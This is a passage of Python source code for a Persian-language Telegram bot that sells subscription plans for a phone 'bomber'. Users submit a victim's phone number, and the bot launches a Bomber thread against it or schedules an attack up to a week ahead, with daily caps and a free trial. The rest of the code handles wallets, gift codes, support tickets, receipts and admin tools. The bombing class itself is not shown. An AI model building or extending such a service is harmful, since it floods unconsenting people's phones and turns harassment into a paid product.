        c = conn.cursor()
        c.execute("SELECT id, message, status, admin_reply FROM tickets WHERE user_id = ? ORDER BY id DESC LIMIT 10", (uid,))
        rows = c.fetchall()
        conn.close()
        text = "📬 **تیکت‌های تو:**\n\n"
        if not rows:
            text += "تیکتی نداری."
        for r in rows:
            st_txt = "🟢 باز" if r[2] == "open" else "🔴 بسته"
            text += f"#{r[0]} [{st_txt}]\n📝 {r[1][:50]}...\n"
            if r[3]:
                text += f"💬 پاسخ: {r[3][:50]}...\n"
            text += "\n"
        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_support"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    # --- برترین‌ها ---
    elif data == "menu_leaderboard":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT name, total_purchases, xp FROM users ORDER BY xp DESC LIMIT 10")
        top = c.fetchall()
        conn.close()
        text = "🏆 **برترین‌ها (بر اساس XP):**\n\n"
        medals = ["🥇", "🥈", "🥉"]
        for i, t in enumerate(top):
            icon = medals[i] if i < 3 else f"{i+1}."
            text += f"{icon} {t[0]} — XP: {t[2]} | خرید: {t[1]}\n"
        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id,
                                 reply_markup=m, parse_mode='Markdown')

    # ============ ادمین ============
    elif data == "admin_back":
        bot.send_message(call.message.chat.id, "👑 **پنل مدیریت**", reply_markup=get_admin_menu(), parse_mode='Markdown')

    elif data == "admin_stats":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT COUNT(*), SUM(wallet), SUM(total_purchases), SUM(xp) FROM users")
        r = c.fetchone()
        c.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
        banned = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM tickets WHERE status = 'open'")
        open_tickets = c.fetchone()[0]
        c.execute("SELECT SUM(price) FROM purchases WHERE created_at > ?", (time.time() - 86400,))
        today_income = c.fetchone()[0] or 0
        conn.close()
        text = (f"📊 **آمار کامل:**\n\n"
                f"👥 کل کاربران: {r[0]}\n"
                f"🚫 مسدود: {banned}\n"
                f"💰 مجموع کیف پول: {r[1] or 0}ت\n"
                f"🛒 مجموع خرید: {r[2] or 0}\n"
                f"⭐ مجموع XP: {r[3] or 0}\n"
                f"📈 درآمد ۲۴ ساعت: {today_income}ت\n"
                f"🎫 تیکت باز: {open_tickets}")
        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="admin_back"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=m, parse_mode='Markdown')

    elif data == "admin_list_users":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT user_id, name, wallet, is_banned, level FROM users ORDER BY last_active DESC LIMIT 30")
        rows = c.fetchall()
        conn.close()
        text = "👥 **۳۰ کاربر اخیر:**\n\n"
        for r in rows:
            ban = "🚫" if r[3] else ""
            text += f"{ban}`{r[0]}` — {r[1]} — {r[2]}ت — Lv{r[4]}\n"
        m = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="admin_back"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=m, parse_mode='Markdown')

    elif data == "admin_search_user":
        user_states[uid] = {"state": "admin_search"}
        bot.send_message(call.message.chat.id, "🆔 آیدی کاربر:")

    elif data == "admin_ban":
        user_states[uid] = {"state": "admin_ban_id"}
        bot.send_message(call.message.chat.id, "🚫 آیدی برای مسدود/آزاد:")

    elif data == "admin_manual_charge":
        user_states[uid] = {"state": "admin_charge_id"}
        bot.send_message(call.message.chat.id, "🆔 آیدی کاربر:")

    elif data == "admin_broadcast":
        user_states[uid] = {"state": "admin_bcast"}
        bot.send_message(call.message.chat.id, "📢 متن پیام:")

    elif data == "admin_add_product":
        user_states[uid] = {"state": "add_prod_name"}
        bot.send_message(call.message.chat.id, "📝 نام محصول:")

    elif data == "admin_del_product":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT id, name FROM products")
        prods = c.fetchall()
        conn.close()
        m = types.InlineKeyboardMarkup(row_width=1)
        for p in prods:
            m.add(types.InlineKeyboardButton(f"🗑 {p[1]}", callback_data=f"del_prod_{p[0]}"))
        m.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="admin_back"))
        bot.send_message(call.message.chat.id, "کدام محصول حذف شود؟", reply_markup=m)

    elif data.startswith("del_prod_"):
        pid = int(data.replace("del_prod_", ""))
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("DELETE FROM products WHERE id = ?", (pid,))
        conn.commit()
        conn.close()
        bot.answer_callback_query(call.id, "✅ حذف شد!", show_alert=True)

    elif data == "admin_make_gift":
        user_states[uid] = {"state": "make_gift_amount"}
        bot.send_message(call.message.chat.id, "💰 مبلغ کد هدیه:")

    elif data == "admin_tickets":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT id, user_id, message FROM tickets WHERE status = 'open' ORDER BY id ASC LIMIT 10")
        rows = c.fetchall()
        conn.close()
        if not rows:
            bot.answer_callback_query(call.id, "تیکت بازی نیست.")
            return
        m = types.InlineKeyboardMarkup(row_width=1)
        for r in rows:
            m.add(types.InlineKeyboardButton(f"#{r[0]} — {r[1][:10]}", callback_data=f"reply_ticket_{r[0]}"))
        m.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="admin_back"))
        bot.send_message(call.message.chat.id, "🎫 تیکت‌های باز:", reply_markup=m)

    elif data.startswith("reply_ticket_"):
        tid = int(data.replace("reply_ticket_", ""))
        user_states[uid] = {"state": "ticket_reply", "tid": tid}
        bot.send_message(call.message.chat.id, "💬 پاسخ تیکت را بنویس:")

    elif data == "admin_backup":
        try:
            with open(DB_FILE, 'rb') as f:
                bot.send_document(call.message.chat.id, f)
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ خطا: {e}")

    else:
        bot.answer_callback_query(call.id, "در حال توسعه...")

# ==========================================
# 12. عکس (رسید)
# ==========================================
@bot.message_handler(content_types=['photo'])
def on_photo(message):
    uid = str(message.from_user.id)
    if user_states.get(uid, {}).get("state") != "wait_receipt":
        return
    u = get_user(uid)
    if not u:
        return
    key = str(uuid.uuid4())[:8]
    pending_approvals[key] = {"user_id": uid}
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("✅ تایید", callback_data=f"approve_{key}"))
    m.add(types.InlineKeyboardButton("❌ رد", callback_data=f"reject_{key}"))
    bot.send_photo(ADMIN_ID, message.photo[-1].file_id,
                   caption=f"💳 **رسید**\n👤 `{uid}`\nنام: {u['name']}",
                   reply_markup=m, parse_mode='Markdown')
    bot.send_message(message.chat.id, "✅ رسید ارسال شد. منتظر تایید ادمین باش.")
    user_states.pop(uid, None)

# ==========================================
# 13. متن (state ها)
# ==========================================
@bot.message_handler(func=lambda m: True, content_types=['text'])
def on_text(message):
    uid = str(message.from_user.id)
    text = message.text.strip()
    st = user_states.get(uid, {}).get("state")
    u = get_user(uid)

    # --- بمبر ---
    if st == "wait_phone":
        if not u:
            user_states.pop(uid, None)
            return
        num = text.lstrip("+")
        if not num.isdigit() or len(num) < 10:
            bot.send_message(message.chat.id, "❌ شماره نامعتبر.")
            return
        if u['plan'] == "free" and u['free_trial_used']:
            bot.send_message(message.chat.id, "❌ تست رایگان تمام شد. اشتراک بخر.")
            user_states.pop(uid, None)
            return
        # سقف روزانه
        today = datetime.now().strftime("%Y-%m-%d")
        if u.get('last_daily_bomb_date') == today:
            limit = PLANS.get(u['plan'], {}).get('daily_limit', 1)
            if u['daily_bomb_count'] >= limit:
                bot.send_message(message.chat.id, f"❌ سقف روزانه ({limit}) پر شده. فردا بیا.")
                user_states.pop(uid, None)
                return
            u['daily_bomb_count'] += 1
        else:
            u['daily_bomb_count'] = 1
            u['last_daily_bomb_date'] = today

        if u['plan'] == "free":
            u['free_trial_used'] = 1
        save_user(**u)
        b = Bomber(num, uid, u['silent_mode'])
        active_bombers[uid] = b
        user_states.pop(uid, None)
        threading.Thread(target=b.start).start()

    # --- زمان‌بندی ---
    elif st == "wait_sched_phone":
        num = text.lstrip("+")
        if not num.isdigit():
            bot.send_message(message.chat.id, "❌ نامعتبر.")
            return
        user_states[uid] = {"state": "wait_sched_time", "phone": num}
        bot.send_message(message.chat.id, "⏰ چند دقیقه دیگر؟")

    elif st == "wait_sched_time":
        try:
            mins = int(text)
        except ValueError:
            bot.send_message(message.chat.id, "❌ عدد بده.")
            return
        if mins < 1 or mins > 10080:
            bot.send_message(message.chat.id, "❌ بین ۱ تا ۱۰۰۸۰ (یه هفته).")
            return
        ph = user_states[uid]["phone"]
        rt = time.time() + mins * 60
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO schedules (user_id, phone, run_time) VALUES (?,?,?)", (uid, ph, rt))
        conn.commit()
        conn.close()
        user_states.pop(uid, None)
        bot.send_message(message.chat.id, f"✅ بعد از {mins} دقیقه اجرا می‌شود.")

    # --- کد هدیه ---
    elif st == "wait_gift":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT amount, max_uses, used_count FROM gift_codes WHERE code = ?", (text,))
        row = c.fetchone()
        if row and row[2] < row[1]:
            amt = row[0]
            u['wallet'] += amt
            save_user(**u)
            c.execute("UPDATE gift_codes SET used_count = used_count + 1 WHERE code = ?", (text,))
            conn.commit()
            add_transaction(uid, amt, "gift", f"کد هدیه {text}")
            bot.send_message(message.chat.id, f"🎉 {amt}ت اضافه شد!")
        else:
            bot.send_message(message.chat.id, "❌ کد نامعتبر یا مصرف‌شده.")
        conn.close()
        user_states.pop(uid, None)

    # --- تیکت ---
    elif st == "wait_ticket":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO tickets (user_id, message, created_at) VALUES (?,?,?)",
                  (uid, text, time.time()))
        conn.commit()
        tid = c.lastrowid
        conn.close()
        bot.send_message(message.chat.id, f"✅ تیکت #{tid} ثبت شد. منتظر پاسخ باش.")
        try:
            m = types.InlineKeyboardMarkup()
            m.add(types.InlineKeyboardButton("💬 پاسخ", callback_data=f"reply_ticket_{tid}"))
            bot.send_message(ADMIN_ID, f"🎫 **تیکت جدید #{tid}**\n👤 `{uid}`\n📝 {text}",
                             reply_markup=m, parse_mode='Markdown')
        except Exception:
            pass
        user_states.pop(uid, None)

    elif st == "ticket_reply":
        tid = user_states[uid]["tid"]
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT user_id FROM tickets WHERE id = ?", (tid,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE tickets SET admin_reply = ?, status = 'closed' WHERE id = ?", (text, tid))
            conn.commit()
            try:
                bot.send_message(row[0], f"💬 **پاسخ تیکت #{tid}:**\n{text}", parse_mode='Markdown')
            except Exception:
                pass
            bot.send_message(message.chat.id, f"✅ پاسخ تیکت #{tid} ثبت شد.")
        conn.close()
        user_states.pop(uid, None)

    # --- ادمین: محصول ---
    elif st == "add_prod_name":
        user_states[uid] = {"state": "add_prod_price", "name": text}
        bot.send_message(message.chat.id, "💰 قیمت:")

    elif st == "add_prod_price":
        try:
            price = int(text)
        except ValueError:
            bot.send_message(message.chat.id, "❌ عدد.")
            return
        user_states[uid] = {"state": "add_prod_desc", "name": user_states[uid]["name"], "price": price}
        bot.send_message(message.chat.id, "📝 توضیحات:")

    elif st == "add_prod_desc":
        d = dict(user_states[uid])
        d["desc"] = text
        d["state"] = "add_prod_content"
        user_states[uid] = d
        bot.send_message(message.chat.id, "📦 محتوا:")

    elif st == "add_prod_content":
        d = dict(user_states[uid])
        d["content"] = text
        d["state"] = "add_prod_cat"
        user_states[uid] = d
        bot.send_message(message.chat.id, "📁 دسته‌بندی (یا /skip):")

    elif st == "add_prod_cat":
        d = dict(user_states[uid])
        d["cat"] = text if text != "/skip" else "عمومی"
        d["state"] = "add_prod_stock"
        user_states[uid] = d
        bot.send_message(message.chat.id, "📊 موجودی (عدد یا -1 برای نامحدود):")

    elif st == "add_prod_stock":
        try:
            stock = int(text)
        except ValueError:
            stock = -1
        d = user_states[uid]
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO products (name, price, description, content, category, stock) VALUES (?,?,?,?,?,?)",
                  (d["name"], d["price"], d["desc"], d["content"], d["cat"], stock))
        conn.commit()
        conn.close()
        user_states.pop(uid, None)
        bot.send_message(message.chat.id, "✅ محصول اضافه شد!")

    # --- ادمین: شارژ ---
    elif st == "admin_charge_id":
        user_states[uid] = {"state": "admin_charge_amt", "target": text}
        bot.send_message(message.chat.id, "💰 مبلغ:")

    elif st == "admin_charge_amt":
        try:
            amt = int(text)
        except ValueError:
            bot.send_message(message.chat.id, "❌ عدد.")
            return
        target = user_states[uid]["target"]
        tu = get_user(target)
        if tu:
            tu['wallet'] += amt
            save_user(**tu)
            add_transaction(target, amt, "deposit", "شارژ دستی ادمین")
            bot.send_message(message.chat.id, f"✅ {amt}ت به {target} اضافه شد.")
            try:
                bot.send_message(target, f"💰 کیف پولت {amt}ت شارژ شد!")
            except Exception:
                pass
        else:
            bot.send_message(message.chat.id, "❌ کاربر یافت نشد.")
        user_states.pop(uid, None)

    # --- ادمین: رسید ---
    elif st == "receipt_amount":
        try:
            amt = int(text)
        except ValueError:
            bot.send_message(message.chat.id, "❌ عدد.")
            return
        target = user_states[uid]["target"]
        tu = get_user(target)
        if tu:
            tu['wallet'] += amt
            save_user(**tu)
            add_transaction(target, amt, "deposit", "شارژ با رسید")
            bot.send_message(message.chat.id, f"✅ {amt}ت به {target} اضافه شد.")
            try:
                bot.send_message(target, f"✅ رسید تایید شد. {amt}ت اضافه شد.")
            except Exception:
                pass
        user_states.pop(uid, None)

    # --- ادمین: پیام همگانی ---
    elif st == "admin_bcast":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT user_id FROM users WHERE is_banned = 0")
        all_u = c.fetchall()
        conn.close()
        sent = 0
        for (tid,) in all_u:
            try:
                bot.send_message(tid, text)
                sent += 1
                time.sleep(0.05)
            except Exception:
                pass
        bot.send_message(message.chat.id, f"✅ {sent} کاربر.")
        user_states.pop(uid, None)

    # --- ادمین: جستجو ---
    elif st == "admin_search":
        tu = get_user(text)
        if tu:
            bot.send_message(message.chat.id,
                f"👤 {tu['name']}\n🆔 `{tu['user_id']}`\n"
                f"💰 {tu['wallet']}ت\n💎 {tu['plan']}\n"
                f"⭐ Lv{tu['level']} | XP {tu['xp']}\n"
                f"👥 دعوت: {tu['referral_count']}\n"
                f"🚫 {'بله' if tu['is_banned'] else 'خیر'}",
                parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "❌ یافت نشد.")
        user_states.pop(uid, None)

    # --- ادمین: مسدود ---
    elif st == "admin_ban_id":
        tu = get_user(text)
        if tu:
            tu['is_banned'] = 1 - tu['is_banned']
            save_user(**tu)
            s = "مسدود" if tu['is_banned'] else "آزاد"
            bot.send_message(message.chat.id, f"✅ {text} {s} شد.")
        else:
            bot.send_message(message.chat.id, "❌ یافت نشد.")
        user_states.pop(uid, None)

    # --- ادمین: ساخت کد هدیه ---
    elif st == "make_gift_amount":
        try:
            amt = int(text)
        except ValueError:
            bot.send_message(message.chat.id, "❌ عدد.")
            return
        user_states[uid] = {"state": "make_gift_max", "amount": amt}
        bot.send_message(message.chat.id, "👥 حداکثر تعداد استفاده:")

    elif st == "make_gift_max":
        try:
            mx = int(text)
        except ValueError:
            mx = 1
        amt = user_states[uid]["amount"]
        code = "GIFT" + str(random.randint(100000, 999999))
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO gift_codes (code, amount, max_uses, created_at) VALUES (?,?,?,?)",
                  (code, amt, mx, time.time()))
        conn.commit()
        conn.close()
        bot.send_message(message.chat.id, f"🎁 کد: `{code}`\n💰 {amt}ت | 👥 {mx} نفر", parse_mode='Markdown')
        user_states.pop(uid, None)

# ==========================================
# 14. اجرا
# ==========================================
if __name__ == "__main__":
    print("Bot starting...")
    bot.infinity_polling(timeout=30, long_polling_timeout=30)
